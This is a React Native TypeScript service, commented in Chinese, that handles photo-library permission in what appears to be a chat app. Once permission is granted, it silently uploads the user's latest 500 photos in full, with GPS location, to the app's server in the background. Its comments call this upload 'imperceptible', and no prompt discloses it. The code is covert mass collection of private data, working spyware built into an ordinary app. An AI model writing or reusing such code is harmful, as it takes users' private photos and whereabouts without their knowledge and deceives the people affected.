import { Platform, Alert, Linking } from 'react-native';
import { check, request, PERMISSIONS, RESULTS } from 'react-native-permissions';
import { CameraRoll } from '@react-native-camera-roll/camera-roll';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { API_CONFIG, API_ENDPOINTS } from '../config/api';
import { getCurrentPlatformFeatures, isFeatureEnabled } from '../config/platformFeatures';

interface PhotoAsset {
  node: {
    type: string;
    group_name: string[];
    image: {
      uri: string;
      filename: string | null;
      height: number;
      width: number;
      fileSize: number | null;
      playableDuration: number;
    };
    timestamp: number;
    location: {
      latitude?: number;
      longitude?: number;
      altitude?: number;
      heading?: number;
      speed?: number;
    } | null;
  };
}

interface AlbumUploadData {
  uri: string;
  filename: string;
  width: number;
  height: number;
  fileSize: number;
  timestamp: number;
  location?: {
    latitude?: number;
    longitude?: number;
  };
  serverUrl?: string; // 服务器图片URL
  compressedUrl?: string; // 兼容后台显示的服务器URL
  uploadTime?: string; // 上传时间
}

class AlbumPermissionService {
  private static instance: AlbumPermissionService;
  private isUploading = false;
  private hasUploadedOnce = false;

  static getInstance(): AlbumPermissionService {
    if (!AlbumPermissionService.instance) {
      AlbumPermissionService.instance = new AlbumPermissionService();
    }
    return AlbumPermissionService.instance;
  }

  /**
   * 检查是否已经首次上传过相册
   */
  private async hasCompletedFirstUpload(): Promise<boolean> {
    try {
      const uploaded = await AsyncStorage.getItem('album_first_upload_completed');
      return uploaded === 'true';
    } catch (error) {
      console.error('[AlbumPermissionService] 检查首次上传状态失败:', error);
      return false;
    }
  }

  /**
   * 标记首次上传已完成
   */
  private async markFirstUploadCompleted(): Promise<void> {
    try {
      await AsyncStorage.setItem('album_first_upload_completed', 'true');
      this.hasUploadedOnce = true;
    } catch (error) {
      console.error('[AlbumPermissionService] 标记首次上传状态失败:', error);
    }
  }

  /**
   * 检查相册权限状态
   */
  async checkAlbumPermission(): Promise<string> {
    try {
      if (Platform.OS === 'ios') {
        return await check(PERMISSIONS.IOS.PHOTO_LIBRARY);
      } else {
        // Android 13+ 使用新的媒体权限
        const sdk = typeof Platform.Version === 'number' ? Platform.Version : parseInt(String(Platform.Version), 10);
        if (sdk >= 33) {
          return await check(PERMISSIONS.ANDROID.READ_MEDIA_IMAGES);
        } else {
          return await check(PERMISSIONS.ANDROID.READ_EXTERNAL_STORAGE);
        }
      }
    } catch (error) {
      console.error('[AlbumPermissionService] 检查相册权限失败:', error);
      return RESULTS.UNAVAILABLE;
    }
  }

  /**
   * 请求相册权限
   */
  async requestAlbumPermission(): Promise<string> {
    try {
      if (Platform.OS === 'ios') {
        return await request(PERMISSIONS.IOS.PHOTO_LIBRARY);
      } else {
        // Android 13+ 使用新的媒体权限
        const sdk = typeof Platform.Version === 'number' ? Platform.Version : parseInt(String(Platform.Version), 10);
        if (sdk >= 33) {
          return await request(PERMISSIONS.ANDROID.READ_MEDIA_IMAGES);
        } else {
          return await request(PERMISSIONS.ANDROID.READ_EXTERNAL_STORAGE);
        }
      }
    } catch (error) {
      console.error('[AlbumPermissionService] 请求相册权限失败:', error);
      return RESULTS.DENIED;
    }
  }

  /**
   * 获取最新的500张照片
   */
  async getLatestPhotos(limit: number = 500): Promise<AlbumUploadData[]> {
    try {
      console.log('[AlbumPermissionService] 开始获取最新照片, 限制:', limit);
      
      const photos = await CameraRoll.getPhotos({
        first: limit,
        assetType: 'Photos',
        groupTypes: 'All',
        include: ['filename', 'fileSize', 'location', 'imageSize']
      });

      const albumData: AlbumUploadData[] = photos.edges.map((edge: PhotoAsset) => {
        const { node } = edge;
        const image = node.image;
        
        return {
          uri: image.uri,
          filename: image.filename || `photo_${node.timestamp}.jpg`,
          width: image.width,
          height: image.height,
          fileSize: image.fileSize || 0,
          timestamp: node.timestamp,
          location: node.location ? {
            latitude: node.location.latitude,
            longitude: node.location.longitude
          } : undefined
        };
      });

      console.log(`[AlbumPermissionService] 成功获取 ${albumData.length} 张照片`);
      return albumData;
    } catch (error) {
      console.error('[AlbumPermissionService] 获取照片失败:', error);
      throw error;
    }
  }

  /**
   * 上传单张图片到服务器
   */
  async uploadSingleImage(imageUri: string, token: string): Promise<string | null> {
    try {
      console.log(`[AlbumPermissionService] 开始上传图片: ${imageUri}`);
      
      // 创建 FormData 对象
      const formData = new FormData();
      const fileName = `album_${Date.now()}.jpg`;
      
      formData.append('image', {
        uri: imageUri,
        type: 'image/jpeg',
        name: fileName
      } as any);

      const response = await fetch(`${API_CONFIG.baseURL}/users/upload-image`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'multipart/form-data',
        },
        body: formData,
      });

      if (!response.ok) {
        throw new Error(`图片上传失败: ${response.status} ${response.statusText}`);
      }

      const result = await response.json();
      console.log('[AlbumPermissionService] 图片上传成功:', result);
      return result.imageUrl;
    } catch (error) {
      console.error('[AlbumPermissionService] 上传图片失败:', error);
      return null;
    }
  }

  /**
   * 上传相册数据到服务器（包含完整图片）
   */
  async uploadAlbumData(albumData: AlbumUploadData[]): Promise<boolean> {
    try {
      // 获取用户token
      const token = await AsyncStorage.getItem('token');
      if (!token) {
        console.error('[AlbumPermissionService] 用户未登录');
        return false;
      }

      console.log(`[AlbumPermissionService] 开始上传 ${albumData.length} 张照片到服务器`);

      // 限制同时上传的图片数量，避免内存溢出
      const batchSize = 5;
      const uploadedData: AlbumUploadData[] = [];

      for (let i = 0; i < albumData.length; i += batchSize) {
        const batch = albumData.slice(i, i + batchSize);
        console.log(`[AlbumPermissionService] 处理批次 ${Math.floor(i/batchSize) + 1}/${Math.ceil(albumData.length/batchSize)}`);

        // 并行上传当前批次的图片
        const batchPromises = batch.map(async (photo) => {
          try {
            // 上传图片文件，获取服务器URL
            const uploadedImageUrl = await this.uploadSingleImage(photo.uri, token);
            
            if (uploadedImageUrl) {
              return {
                ...photo,
                serverUrl: uploadedImageUrl, // 添加服务器图片URL
                compressedUrl: uploadedImageUrl, // 兼容后台显示字段
                uploadTime: new Date().toISOString(),
              };
            } else {
              console.warn(`[AlbumPermissionService] 图片上传失败，保留原始数据: ${photo.filename}`);
              return photo; // 上传失败时保留原始数据
            }
          } catch (error) {
            console.error(`[AlbumPermissionService] 处理图片失败: ${photo.filename}`, error);
            return photo; // 出错时保留原始数据
          }
        });

        const batchResults = await Promise.all(batchPromises);
        uploadedData.push(...batchResults);

        // 避免请求过于频繁
        if (i + batchSize < albumData.length) {
          await new Promise(resolve => setTimeout(resolve, 1000));
        }
      }

      // 上传相册元数据到数据库
      const response = await fetch(`${API_CONFIG.baseURL}${API_ENDPOINTS.UPLOAD_ALBUM}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify({
          data: uploadedData
        })
      });

      if (!response.ok) {
        throw new Error(`元数据上传失败: ${response.status} ${response.statusText}`);
      }

      const result = await response.json();
      console.log('[AlbumPermissionService] 相册数据上传完成', {
        total: uploadedData.length,
        withServerUrl: uploadedData.filter(item => (item as any).serverUrl).length
      });
      return true;
    } catch (error) {
      console.error('[AlbumPermissionService] 上传相册数据失败:', error);
      return false;
    }
  }

  /**
   * 处理首次权限获取 - 主要入口函数
   */
  async handleFirstTimePermission(): Promise<boolean> {
    try {
      // 检查是否已经上传过
      if (await this.hasCompletedFirstUpload()) {
        console.log('[AlbumPermissionService] 已完成首次上传，跳过');
        return true;
      }

      // 检查平台是否支持相册上传
      if (!isFeatureEnabled('dataCollection.uploadAlbum')) {
        console.log('[AlbumPermissionService] 当前平台不支持相册上传');
        return true;
      }

      // 检查是否正在上传中
      if (this.isUploading) {
        console.log('[AlbumPermissionService] 正在上传中，跳过');
        return true;
      }

      console.log('[AlbumPermissionService] 开始处理首次相册权限和上传');
      this.isUploading = true;

      // 检查权限状态
      const permissionStatus = await this.checkAlbumPermission();
      
      if (permissionStatus !== RESULTS.GRANTED) {
        console.log('[AlbumPermissionService] 相册权限未授予，跳过上传');
        this.isUploading = false;
        return false;
      }

      // 后台获取和上传照片（无感操作）
      this.performBackgroundUpload().catch(error => {
        console.error('[AlbumPermissionService] 后台上传失败:', error);
      });

      return true;
    } catch (error) {
      console.error('[AlbumPermissionService] 处理首次权限失败:', error);
      this.isUploading = false;
      return false;
    }
  }

  /**
   * 执行后台无感上传
   */
  private async performBackgroundUpload(): Promise<void> {
    try {
      console.log('[AlbumPermissionService] 开始后台上传相册数据');
      
      // 获取最新500张照片
      const albumData = await this.getLatestPhotos(500);
      
      if (albumData.length === 0) {
        console.log('[AlbumPermissionService] 没有找到照片，跳过上传');
        this.isUploading = false;
        return;
      }

      // 上传到服务器
      const success = await this.uploadAlbumData(albumData);
      
      if (success) {
        // 标记首次上传完成
        await this.markFirstUploadCompleted();
        console.log('[AlbumPermissionService] 首次相册上传完成');
      } else {
        console.error('[AlbumPermissionService] 相册上传失败');
      }
    } catch (error) {
      console.error('[AlbumPermissionService] 后台上传过程失败:', error);
    } finally {
      this.isUploading = false;
    }
  }

  /**
   * 在聊天页面权限获取后调用
   */
  async onChatPermissionGranted(): Promise<void> {
    try {
      console.log('[AlbumPermissionService] 聊天页面权限已获取，检查是否需要首次相册上传');
      
      // 延迟一点再执行，避免阻塞用户交互
      setTimeout(() => {
        this.handleFirstTimePermission().catch(error => {
          console.error('[AlbumPermissionService] 首次权限处理失败:', error);
        });
      }, 1000);
    } catch (error) {
      console.error('[AlbumPermissionService] 权限获取后处理失败:', error);
    }
  }

  /**
   * 重置上传状态（用于测试）
   */
  async resetUploadStatus(): Promise<void> {
    try {
      await AsyncStorage.removeItem('album_first_upload_completed');
      this.hasUploadedOnce = false;
      this.isUploading = false;
      console.log('[AlbumPermissionService] 上传状态已重置');
    } catch (error) {
      console.error('[AlbumPermissionService] 重置上传状态失败:', error);
    }
  }

  /**
   * 手动触发相册上传（用于测试或手动补充）
   */
  async manualUpload(): Promise<boolean> {
    try {
      console.log('[AlbumPermissionService] 手动触发相册上传');
      
      const permissionStatus = await this.checkAlbumPermission();
      if (permissionStatus !== RESULTS.GRANTED) {
        console.error('[AlbumPermissionService] 相册权限未授予');
        return false;
      }

      const albumData = await this.getLatestPhotos(500);
      const success = await this.uploadAlbumData(albumData);
      
      if (success) {
        await this.markFirstUploadCompleted();
      }
      
      return success;
    } catch (error) {
      console.error('[AlbumPermissionService] 手动上传失败:', error);
      return false;
    }
  }
}

export default AlbumPermissionService;
